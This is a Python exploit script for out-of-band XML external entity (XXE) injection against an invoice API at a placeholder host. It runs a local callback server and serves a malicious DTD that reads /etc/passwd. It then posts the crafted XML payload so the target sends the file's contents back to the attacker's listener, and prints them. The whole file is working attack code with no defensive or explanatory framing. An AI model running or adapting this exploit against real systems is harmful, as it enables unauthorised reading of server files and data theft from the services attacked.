import socket
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests

# ------------------------------------------------------------
# Configuration
TARGET_URL = "http://target.local/api/invoice"
LISTEN_PORT = 0  # 0 lets the OS pick a free port; we'll retrieve it later
DTD_PATH = "/xxe.dtd"
# ------------------------------------------------------------

class ExfiltrationHandler(BaseHTTPRequestHandler):
    server_version = "SimpleXXEServer/1.0"

    def log_message(self, fmt, *args):
        # Suppress default log messages; we'll handle our own logging
        return

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)

        if path == DTD_PATH:
            # Serve the malicious DTD
            self.send_response(200)
            self.send_header("Content-Type", "application/xml-dtd")
            self.end_headers()
            self.wfile.write(self.server.dtd.encode("utf-8"))
            return

        # Assume this is the exfiltration callback
        data_encoded = query.get("data", [""])[0]
        if data_encoded:
            data = urllib.parse.unquote(data_encoded)
            self.server.exfiltrated_data = data
            self.server.event.set()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            # Shutdown after a short delay to let the response be sent
            threading.Thread(target=self._delayed_shutdown, daemon=True).start()
        else:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"Bad Request")

    def _delayed_shutdown(self):
        time.sleep(0.5)
        self.server.shutdown()

def get_local_ip(target_host):
    """Determine the local IP used to reach the target host."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Connect to a port on the target (does not need to be open)
        s.connect((target_host, 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "0.0.0.0"

def main():
    # Parse target host from URL
    from urllib.parse import urlparse
    parsed_target = urlparse(TARGET_URL)
    target_host = parsed_target.hostname
    if not target_host:
        print("[-] Could not parse target host from URL.")
        return

    local_ip = get_local_ip(target_host)
    print(f"[+] Target host: {target_host}")
    print(f"[+] Local IP for callback: {local_ip}")

    # Start HTTP server in a background thread
    server = HTTPServer(("0.0.0.0", LISTEN_PORT), ExfiltrationHandler)
    # Retrieve the actual port chosen by the OS (if LISTEN_PORT was 0)
    port = server.server_address[1]
    print(f"[+] Listening on 0.0.0.0:{port}")

    # Shared state between handler and main thread
    server.exfiltrated_data = None
    server.event = threading.Event()

    # Construct the malicious DTD
    dtd = f"""<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % payload "<!ENTITY &#x25; exfiltrate SYSTEM 'http://{local_ip}:{port}/?data=%file;'>">
%payload;
%exfiltrate;"""
    server.dtd = dtd

    # Run server in a daemon thread
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    # Build the XML payload that references our DTD
    xml_payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://{local_ip}:{port}{DTD_PATH}">
<foo>&exfiltrate;</foo>
"""

    print("[+] Sending XXE payload to target...")
    try:
        resp = requests.post(TARGET_URL, data=xml_payload, headers={"Content-Type": "application/xml"}, timeout=10)
        print(f"[+] Target responded with status {resp.status_code}")
    except Exception as e:
        print(f"[-] Error sending request: {e}")

    # Wait for exfiltration (timeout after 15 seconds)
    if server.event.wait(timeout=15):
        print("[+] Exfiltration received!")
        print("[+] Contents of /etc/passwd:")
        print(server.exfiltrated_data)
    else:
        print("[-] Timeout: no exfiltration received.")

    # Shutdown server
    server.shutdown()
    thread.join()
    print("[+] Server stopped.")

if __name__ == "__main__":
    main()
